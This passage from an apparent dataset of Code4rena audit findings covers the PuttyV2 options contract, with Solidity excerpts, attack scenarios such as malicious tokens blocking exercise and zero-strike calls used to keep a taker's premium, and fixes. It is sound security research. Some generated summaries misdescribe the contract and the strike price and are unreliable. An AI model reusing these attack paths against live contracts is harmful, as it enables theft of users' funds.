return;\n}\n```\n\nContrary, put options are free of any fees:\n\n[PuttyV2.sol#L450-L451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L450-L451)\n\n```solidity\n// transfer strike from putty to exerciser\nERC20(order.baseAsset).safeTransfer(msg.sender, order.strike);\n```\n\n### Recommended Mitigation Steps\n\nCharge fees also for exercised put options.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/285#issuecomment-1176533283):**\n > Fees are only applied on puts if they are expired.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/285#issuecomment-1179907369):**\n > Making this the primary issue for the med severity issue, as per my comment in [#269](https://github.com/code-423n4/2022-06-putty-findings/issues/269):\n> > \"Put option not being charged fee upon exercising it. This can be considered to the \"protocol leaked value\" and thus be given a medium severity rating.\"\n\n**[outdoteth (Putty Finance) confirmed and resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/285#issuecomment-1185411614):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269).\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in PuttyV2.sol, a smart contract used for trading options. The vulnerability is that fees are not charged when put options are exercised. Put options are options that give the holder the right to sell an asset at a certain price. When a put option is exercised, the holder receives the strike price (the price the option was bought at) denominated in order.baseAsset. Call options, on the other hand, give the holder the right to buy an asset at a certain price, and when a call option is exercised, the holder sends the strike price to Putty and the short position holder is able to withdraw the strike amount. \n\nThe bug report provides proof of concept for the vulnerability. It states that the protocol fee is correctly charged for exercised calls, but that put options are free of any fees. The code for this is provided in the report. \n\nThe recommended mitigation step for this vulnerability is to charge fees also for exercised put options.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/285",
      "tags": [],
      "finders": [
        "swit",
        "0xsanson",
        "Metatron",
        "berndartmueller",
        "Lambda",
        "hubble"
      ]
    },
    {
      "id": "2936",
      "title": "[M-03] Put option sellers can prevent exercise by specifying zero amounts, or non-existant tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI, also found by 0xNineDec, exd0tpy, and zzzitron_\n\nPut option buyers pay an option premium to the seller for the privilege of being able to 'put' assets to the seller and get the strike price for it rather than the current market price. If they're unable to perform the 'put', they've paid the premium for nothing, and essentially have had funds stolen from them.\n\n### Proof of Concept\n\nIf the put option seller includes in `order.erc20Assets`, an amount of zero for any of the assets, or specifies an asset that doesn't currently have any code at its address, the put buyer will be unable to exercise the option, and will have paid the premium for nothing:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n453               // transfer assets from exerciser to putty\n454               _transferERC20sIn(order.erc20Assets, msg.sender);\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L453-L454>\n\nThe function reverts if any amount is equal to zero, or the asset doesn't exist:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n593       function _transferERC20sIn(ERC20Asset[] memory assets, address from) internal {\n594           for (uint256 i = 0; i < assets.length; i++) {\n595               address token = assets[i].token;\n596               uint256 tokenAmount = assets[i].tokenAmount;\n597   \n598               require(token.code.length > 0, \"ERC20: Token is not contract\");\n599               require(tokenAmount > 0, \"ERC20: Amount too small\");\n600   \n601               ERC20(token).safeTransferFrom(from, address(this), tokenAmount);\n602           }\n603       }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L593-L603>\n\n### Recommended Mitigation Steps\n\nVerify the asset amounts and addresses during `fillOrder()`, and allow exercise if the token no longer exists at that point in time.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/223#issuecomment-1177638096):**\n > At the contract level there exists 2 possible mitigations;\n> \n> 1) Remove the zero amount check (not feasible because it will cause another DOS issue for tokens that revert on 0 transfer).\n> 2) Check all erc20 assets are valid in `fillOrder` (gas tradeoff because it requires an O(n) loop to check).\n> \n> Instead, the best mitigation imo is to add a check on the frontend/db level to ensure that all erc20 assets have a token amount greater than 0 and that it exists as a contract.\n> \n> If users want to go lower level than the db/frontend then they must exercise their own diligence.\n> \n> edit: decided to go with a 3rd option instead.\n> \n> Simply skip the ERC20 transfer if the amount is 0.<br>\n>\n> Report: Setting an erc20Asset with a zero amount or with no code at the address will result in a revert when exercising a put option.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/223#issuecomment-1185412355):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/8.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed zero amount part by introducing the noop for zero amount transfers in both `_transferERC20sIn` and `_transferERC20sOut` ERC20 transfer functions. The second part of the issue, fake tokens, is similar to [M-01](https://github.com/code-423n4/2022-06-putty-findings/issues/50), [M-02](https://github.com/code-423n4/2022-06-putty-findings/issues/227).\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability that affects Put option buyers in the PuttyV2.sol contract. If the put option seller includes in `order.erc20Assets`, an amount of zero for any of the assets, or specifies an asset that doesn't currently have any code at its address, the put buyer will be unable to exercise the option, and will have paid the premium for nothing. The vulnerability was identified through code inspection. To mitigate the issue, it is recommended to verify the asset amounts and addresses during `fillOrder()`, and allow exercise if the token no longer exists at that point in time.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/223",
      "tags": [
        "Token Existence"
      ],
      "finders": [
        "exd0tpy",
        "IllIllI",
        "0xNineDec",
        "zzzitron"
      ]
    },
    {
      "id": "2935",
      "title": "[M-02] Unbounded loops may cause exercise()s and withdraw()s to fail ",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L636-L640\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L646-L650\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L657-L661\n\n\n## Vulnerability details\n\n## Impact\nThere are no bounds on the number of tokens transferred in an order, and gas requirements can change (especially since orders can have a duration of [27 years](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L287)), so orders filled at time T1 may not be exercisable/withdrawable at time T2, or with the provided assets if the assets use a lot of gas during their transfers (e.g. aTokens and cTokens). The buyer of the option will have paid the premium, and will be unable to get the assets they are owed.\n\n\n## Proof of Concept\nThere are no upper bounds on the number of assets being transferred in these loops:\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n636       function _transferERC20sOut(ERC20Asset[] memory assets) internal {\n637           for (uint256 i = 0; i < assets.length; i++) {\n638               ERC20(assets[i].token).safeTransfer(msg.sender, assets[i].tokenAmount);\n639           }\n640       }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L636-L640\n\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n646       function _transferERC721sOut(ERC721Asset[] memory assets) internal {\n647           for (uint256 i = 0; i < assets.length; i++) {\n648               ERC721(assets[i].token).safeTransferFrom(address(this), msg.sender, assets[i].tokenId);\n649           }\n650       }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L646-L650\n\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #3\n\n657       function _transferFloorsOut(address[] memory floorTokens, uint256[] memory floorTokenIds) internal {\n658           for (uint256 i = 0; i < floorTokens.length; i++) {\n659               ERC721(floorTokens[i]).safeTransferFrom(address(this), msg.sender, floorTokenIds[i]);\n660           }\n661       }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L657-L661\n\n\n## Tools Used\nCode inspection\n\n\n## Recommended Mitigation Steps\nHave an upper bound on the number of assets, or allow them to be transferred out one at a time, if necessary",
      "summary": "\nThis bug report is about the PuttyV2 smart contract, which is used to facilitate the transfer of tokens across different platforms. The code inspection tool has identified a vulnerability in the contract, which can be exploited to transfer an unlimited number of tokens in one transaction. This could cause a problem if the assets being transferred use a lot of gas during their transfer, as the buyer of the option may not be able to get the assets they are owed.\n\nThe code inspection tool has identified three lines of code that are vulnerable to this exploit. These are lines 636-640, 646-650, and 657-661. These lines of code allow the contract to transfer an unlimited number of tokens in one transaction.\n\nThe recommended mitigation step for this vulnerability is to have an upper bound on the number of assets that can be transferred in one transaction, or to allow them to be transferred out one at a time. This will ensure that the buyer of the option is able to get the assets they are owed, even if the assets use a lot of gas during their transfer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/227",
      "tags": [],
      "finders": [
        "IllIllI",
        "xiaoming90_",
        "sashiketh",
        "shung",
        "0xNineDec"
      ]
    },
    {
      "id": "2934",
      "title": "[M-01] Malicious Token Contracts May Lead To Locking Orders",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird, also found by 0xA5DF, cccz, chatch, csanuragjain, Alex the Entreprenerd, hansfriese, hyh, itsmeSTYJ, Kenshin, pedroais, sashik_eth, unforgiven, and xiaoming90_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L79>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L80>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L81>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L72>\n\n### Impact\n\nIt is possible to prevent an order from executing `exercise()` or `withdraw()` by having a malicious token contract included in the order as part of the any of the following fields.\n\n*   `baseAsset`\n*   `floorTokens[]`\n*   `erc20Assets[]`\n*   `erc721Assets[]`\n\nAn attacker as a maker may create an order and set one of these addresses to a malicious contract in the attackers control. The attacker allows the user to fill the order then toggles a variable on the malicious contract which always causes it to revert.\n\nThe attacker benefits by preventing orders from being `exercise()` if they are in an undesirable position (e.g. if they have gone short and the price has gone up). The attacker waits for either the time to expire or the price to go down and allows transfers to occur on their malicious token.\n\nSimilar attacks can also be performed over the `withdraw()` function since this also makes calls to untrusted external addresses. This would allow an attacker to exercise an option then prevent the other user from claiming any of the NFTs or ERC20 tokens that are owed to them.\n\n### Proof of Concept\n\nAny of the transfers in [exercise](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L389-L458) make external calls to untrusted addresses.\n\n```solidity\n    function exercise(Order memory order, uint256[] calldata floorAssetTokenIds) public payable {\n        /* ~~~ CHECKS ~~~ */\n\n\n        bytes32 orderHash = hashOrder(order);\n\n\n        // check user owns the position\n        require(ownerOf(uint256(orderHash)) == msg.sender, \"Not owner\");\n\n\n        // check position is long\n        require(order.isLong, \"Can only exercise long positions\");\n\n\n        // check position has not expired\n        require(block.timestamp < positionExpirations[uint256(orderHash)], \"Position has expired\");\n\n\n        // check floor asset token ids length is 0 unless the position type is put\n        !order.isCall\n            ? require(floorAssetTokenIds.length == order.floorTokens.length, \"Wrong amount of floor tokenIds\")\n            : require(floorAssetTokenIds.length == 0, \"Invalid floor tokenIds length\");\n\n\n        /* ~~~ EFFECTS ~~~ */\n\n\n        // send the long position to 0xdead.\n        // instead of doing a standard burn by sending to 0x000...000, sending\n        // to 0xdead ensures that the same position id cannot be minted again.\n        transferFrom(msg.sender, address(0xdead), uint256(orderHash));\n\n\n        // mark the position as exercised\n        exercisedPositions[uint256(orderHash)] = true;\n\n\n        emit ExercisedOrder(orderHash, floorAssetTokenIds, order);\n\n\n        /* ~~~ INTERACTIONS ~~~ */\n\n\n        if (order.isCall) {\n            // -- exercising a call option\n\n\n            // transfer strike from exerciser to putty\n            // handle the case where the taker uses native ETH instead of WETH to pay the strike\n            if (weth == order.baseAsset && msg.value > 0) {\n                // check enough ETH was sent to cover the strike\n                require(msg.value == order.strike, \"Incorrect ETH amount sent\");\n\n\n                // convert ETH to WETH\n                // we convert the strike ETH to WETH so that the logic in withdraw() works\n                // - because withdraw() assumes an ERC20 interface on the base asset.\n                IWETH(weth).deposit{value: msg.value}();\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n            }\n\n\n            // transfer assets from putty to exerciser\n            _transferERC20sOut(order.erc20Assets);\n            _transferERC721sOut(order.erc721Assets);\n            _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[uint256(orderHash)]);\n        } else {\n            // -- exercising a put option\n\n\n            // save the floor asset token ids to the short position\n            uint256 shortPositionId = uint256(hashOppositeOrder(order));\n            positionFloorAssetTokenIds[shortPositionId] = floorAssetTokenIds;\n\n\n            // transfer strike from putty to exerciser\n            ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike);\n\n\n            // transfer assets from exerciser to putty\n            _transferERC20sIn(order.erc20Assets, msg.sender);\n            _transferERC721sIn(order.erc721Assets, msg.sender);\n            _transferFloorsIn(order.floorTokens, floorAssetTokenIds, msg.sender);\n        }\n    }\n```\n\nThe attacker must control one of these contracts and have it set as a malicious ERC20 / ERC721 function that fails under attacker controlled conditions.\n\n### Recommended Mitigation Steps\n\nConsider whitelisting approved ERC20 token or ERC721 address contracts to prevent users setting malicious token contracts. However, this remediation will have a significant admin input / gas trade-offs.\n\n**[outdoteth (Putty Finance) acknowledged and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/50#issuecomment-1177630161):**\n > Technically this is a valid finding. However we don't intend to fix this at the contract level. Instead there will be adequate warnings on the UI to inform a user that they should be vigilant for any tokens that are not verified by putty (in addition, the UI will show the unverified token's logo as a question mark instead of as the token's logoURI).\n>\n > Report: Setting malicious or invalid erc721Assets, erc20Assets or floorTokens prevents the option from being exercised.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/50#issuecomment-1179463134):**\n > It's contingent on the external requirement for the attacker to be in control of a malicious ERC20 or NFT. Hence, medium severity is appropriate: `2-Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`\n\n**[Pedroais (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/50#issuecomment-1194894079):**\n > I will argue why this issue should be high severity instead of medium.  \n> \n> \"It's contingent on the external requirement for the attacker to be in control of a malicious ERC20 or NFT. \"\n> \n> Anyone can deploy a malicious contract and pass it as an ERC20 or NFT. This is not an external requirement, anyone can do it. Any malicious contract deployed by the attacker will work.\n> \n> This issue imposes a risk of asset loss to users without external requirements. The sponsor states unknown tokens will be shown with a question mark in the UI. This is ok but I think the attack is high severity since the user would be reasonable to think if he is accepting an offer for a BAYC (example of an expensive NFT)  and some unknown token that in the worse case he should at least get the BAYC. This attack doesn't require the user to be dumb or act recklessly but just normal functioning of the protocol. The fake token shouldn't prevent the user from exercising the real BAYC.\n> \n> A user would be reasonable to expect to at least be able to exercise the real NFT in a case with an option that includes a real NFT and a malicious one. The problem is the malicious NFT can block the exercise of the real NFT. An option can be created using  many real and valuable tokens with just 1 malicious token that prevents exercising the real ones.\n> \n> I hope the judge can consider these arguments and make his decision.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/50#issuecomment-1198793737):**\n> I should have phrased it better. The external requirement isn't on the attacker being in control of the malicious ERC20 / NFT. As rightfully pointed out, it can be easily done.\n> \n> The external requirement here is the user deciding to fill an option containing malicious assets. Such options can be considered to be honeypots that users should be made aware of (eg. through documentation, PSAs or warnings to the user). There's only so much the protocol can do to protect users, with tradeoffs against centralisation risks if the suggestion of whitelisting assets is adopted.\n> \n> > This attack doesn't require the user to be dumb or act recklessly but just normal functioning of the protocol. The fake token shouldn't prevent the user from exercising the real BAYC.\n> \n> Partial exercising of options could be a feature, but opens up new attack surfaces and would be a non-trivial to implement. It is a limitation of the protocol that should be clearly communicated to users.\n\n**hyh (warden) reviewed mitigation:**\n > Now addressed on UI/DB level.\n\n***\n\n",
      "summary": "\nThis bug report concerns the PuttyV2.sol contract, which is part of the code-423n4/2022-06-putty repository. An attacker could use this vulnerability to prevent an order from executing the exercise() or withdraw() functions by including a malicious token contract in any of the fields of the order: baseAsset, floorTokens[], erc20Assets[], or erc721Assets[]. This would allow the attacker to benefit by preventing orders from being exercised if they are in an undesirable position, and also prevent the other user from claiming any of the NFTs or ERC20 tokens that are owed to them.\n\nThe vulnerability is present because any of the transfers in the exercise() function make external calls to untrusted addresses. The attacker must control one of these contracts and have it set as a malicious ERC20/ERC721 function that fails under attacker-controlled conditions.\n\nTo mitigate this vulnerability, the system could consider whitelisting approved ERC20 token or ERC721 address contracts to prevent users from setting malicious token contracts. However, this remediation would require significant admin input and incur gas trade-offs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/50",
      "tags": [],
      "finders": [
        "csanuragjain",
        "sashiketh",
        "unforgiven",
        "cccz",
        "Kenshin",
        "pedroais",
        "itsmeSTYJ",
        "kirk-baird",
        "hansfriese",
        "chatch",
        "hyh",
        "Alex the Entreprenerd",
        "xiaoming90_",
        "0xA5DF"
      ]
    },
    {
      "id": "2933",
      "title": "[H-04] Zero strike call options can be systemically used to steal premium from the taker",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by hansfriese_\n\nSome non-malicious ERC20 do not allow for zero amount transfers and order.baseAsset can be such an asset. Zero strike calls are valid and common enough derivative type. However, the zero strike calls with such baseAsset will not be able to be exercised, allowing maker to steal from the taker as a malicious maker can just wait for expiry and withdraw the assets, effectively collecting the premium for free. The premium of zero strike calls are usually substantial.\n\nMarking this as high severity as in such cases malicious maker knowing this specifics can steal from taker the whole premium amount. I.e. such orders will be fully valid for a taker from all perspectives as inability to exercise is a peculiarity of the system which taker in the most cases will not know beforehand.\n\n### Proof of Concept\n\nCurrently system do not check the strike value, unconditionally attempting to transfer it:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437>\n\n```solidity\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n            }\n```\n\nAs a part of call exercise logic:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L422-L443>\n\n```solidity\n    function exercise(Order memory order, uint256[] calldata floorAssetTokenIds) public payable {\n        ...\n\n        if (order.isCall) {\n            // -- exercising a call option\n\n            // transfer strike from exerciser to putty\n            // handle the case where the taker uses native ETH instead of WETH to pay the strike\n            if (weth == order.baseAsset && msg.value > 0) {\n                // check enough ETH was sent to cover the strike\n                require(msg.value == order.strike, \"Incorrect ETH amount sent\");\n\n                // convert ETH to WETH\n                // we convert the strike ETH to WETH so that the logic in withdraw() works\n                // - because withdraw() assumes an ERC20 interface on the base asset.\n                IWETH(weth).deposit{value: msg.value}();\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n            }\n\n            // transfer assets from putty to exerciser\n            _transferERC20sOut(order.erc20Assets);\n            _transferERC721sOut(order.erc721Assets);\n            _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[uint256(orderHash)]);\n        }\n```\n\nSome tokens do not allow zero amount transfers:\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\nThis way for such a token and zero strike option the maker can create short call order, receive the premium:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L327-L339>\n\n```solidity\n            if (weth == order.baseAsset && msg.value > 0) {\n                // check enough ETH was sent to cover the premium\n                require(msg.value == order.premium, \"Incorrect ETH amount sent\");\n\n                // convert ETH to WETH and send premium to maker\n                // converting to WETH instead of forwarding native ETH to the maker has two benefits;\n                // 1) active market makers will mostly be using WETH not native ETH\n                // 2) attack surface for re-entrancy is reduced\n                IWETH(weth).deposit{value: msg.value}();\n                IWETH(weth).transfer(order.maker, msg.value);\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);\n            }\n```\n\nTransfer in the assets:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L366-L371>\n\n```solidity\n        // filling short call: transfer assets from maker to contract\n        if (!order.isLong && order.isCall) {\n            _transferERC20sIn(order.erc20Assets, order.maker);\n            _transferERC721sIn(order.erc721Assets, order.maker);\n            return positionId;\n        }\n```\n\nAnd wait for expiration, knowing that all attempts to exercise will revert:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437>\n\n```solidity\n            } else {\n                ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n            }\n```\n\nThen recover her assets:\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L508-L519>\n\n```solidity\n        // transfer assets from putty to owner if put is exercised or call is expired\n        if ((order.isCall && !isExercised) || (!order.isCall && isExercised)) {\n            _transferERC20sOut(order.erc20Assets);\n            _transferERC721sOut(order.erc721Assets);\n\n            // for call options the floor token ids are saved in the long position in fillOrder(),\n            // and for put options the floor tokens ids are saved in the short position in exercise()\n            uint256 floorPositionId = order.isCall ? longPositionId : uint256(orderHash);\n            _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[floorPositionId]);\n\n            return;\n        }\n```\n\n### Recommended Mitigation Steps\n\nConsider checking that strike is positive before transfer in all the cases, for example:\n\n```solidity\n            } else {\n+               if (order.strike > 0) {\n                    ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n+               }\n            }\n```\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/418#issuecomment-1174522101):**\n > Seems contingent on token implementation, however certain ERC20 do revert on 0 transfer and there would be no way to exercise the contract in that case.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/418#issuecomment-1178989277):**\n > Report: Cannot exercise call contract if strike is 0 and baseAsset reverts on 0 transfers.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/418#issuecomment-1182684476):**\n > There is a pre-requisite for the ERC20 token to revert on 0 amount transfers. However, the warden raised a key point: zero strike calls are common, and their premium is substantial. The information asymmetry of the ERC20 token between the maker and taker is another aggravating factor.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/418#issuecomment-1185410362):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/3.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by conditioning call's logic on `order.strike > 0`. There is no use case for zero strike puts and so this case remains unconditioned, i.e. still always require successful `order.strike` transfer. \n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the PuttyV2.sol contract which allows malicious makers to steal from takers. This vulnerability is caused by the code not checking the strike value and attempting to transfer it unconditionally. This is a problem because some tokens do not allow zero amount transfers, meaning malicious makers can create short call orders, receive the premium, transfer in the assets, and wait for expiration without being able to exercise the option, allowing them to effectively steal the premium. To mitigate this vulnerability, the code should check that the strike is positive before transferring it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/418",
      "tags": [],
      "finders": [
        "hyh",
        "hansfriese"
      ]
    },
    {
      "id": "2932",
      "title": "[H-03] Create a short call order with non empty floor makes the option impossible to exercise and withdraw",
      "impact": "HIGH",
      "content": "_Submitted by zzzitron, also found by danb, Kenshin, Metatron, minhquanym, and PwnedNoMore_\n\n**HIGH** - assets can be lost\n\nIf a short call order is created with non empty floorTokens array, the taker cannot exercise. Also, the maker cannot withdraw after the expiration. The maker will still get premium when the order is filled. If the non empty floorTokens array was included as an accident, it is a loss for both parties: the taker loses premium without possible exercise, the maker loses the locked ERC20s and ERC721s.\n\nThis bug is not suitable for exploitation to get a 'free' premium by creating not exercisable options, because the maker will lose the ERC20s and ERC721s without getting any strike. In that sense it is similar but different issue to the `Create a short put order with zero tokenAmount makes the option impossible to exercise`, therefore reported separately.\n\n### Proof of Concept\n\n*   [proof of concept](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L153-L202)\n*   [reference case](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L194-L21://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L204-L226)\n\nThe proof of concept shows a scenario where babe makes an short call order with non empty `floorTokens` array. Bob filled the order, and now he has long call option NFT. He wants to exercise his option and calls `exercise`. There are two cases.\n\n*   case 1: he calls exercise with empty `floorAssetTokenIds` array\n*   case 2: he calls exercise with non-empty `floorAssetTokenIds` array with matching length to the `orders.floorTokens`\n\nIn the case1, [the input `floorAssetTokenIds` were checked to be empty for put orders](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L406), and his call passes this requirement. But eventually `_transferFloorsIn` was called and he gets `Index out of bounds` error, because `floorTokens` is not empty [which does not match with empty `floorAssetTokenIds`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L627-L629).\n\n```solidity\n// case 1\n  // PuttyV2.sol: _transferFloorsIn called by exercise\n  // The floorTokens and floorTokenIds do not match the lenghts\n  // floorTokens.length is not zero, while floorTokenIds.length is zero\n\n       ERC721(floorTokens[i]).safeTransferFrom(from, address(this), floorTokenIds[i]);\n```\n\nIn the case2, [the input `floorAssetTokenIds` were checked to be empty for put orders](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L406), but it is not empty. So it reverts.\n\n    // case2\n    // PuttyV2.sol: exercise\n    // non empty floorAssetTokenIds array is passed for put option, it will revert\n\n            !order.isCall\n                ? require(floorAssetTokenIds.length == order.floorTokens.length, \"Wrong amount of floor tokenIds\")\n                : require(floorAssetTokenIds.length == 0, \"Invalid floor tokenIds length\");\n\nAfter the option is expired, the maker - babe is trying to withdraw but fails due to the [same issue with the case1](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L516).\n\n```solidity\n// maker trying to withdraw\n// PuttyV2.sol: withdraw\n\n  _transferFloorsOut(order.floorTokens, positionFloorAssetTokenIds[floorPositionId]);\n```\n\nNote on the PoC:\n\n*   The [test for case1 is commented out](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L182-L183) because foundry could not catch the revert. But by running the test with un-commenting these lines will show that the call reverts with `Index out of bounds`.\n*   For the same reason the [withdraw](https://gist.github.com/zzzitron/9f83516255fa6153a4deb04f2163a0b3#file-2022-07-puttyv2-t-sol-L199-L200) also is commented out\n*   The reference case just shows that it works as intended when the order does not contain non-empty `floorTokens`.\n\n### Tools Used\n\nFoundry.\n\n### Recommended Mitigation Steps\n\nIt happens because the [`fillOrder` does not ensure](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L296-L298) the `order.floorTokens` to be empty when the order is short call.\n\n**[STYJ (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1174764713):**\n > Note that it is possible to cause loss of funds for others through this.\n> \n> Assume that maker (A) creates a long call and taker (B) fills it, transferring floor tokens (XYZ) into putty. \n> \n> If maker (C) creates a short call with floorTokens (XYZ), taker (D) is able to fill and exercise his long call since XYZ already resides on Putty. This will however invalidate the options pair that was created between A and B since A cannot exercise and B cannot withdraw.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1178995529):**\n > Agree that this should be marked as high severity given the exploit scenario provided by @STYJ 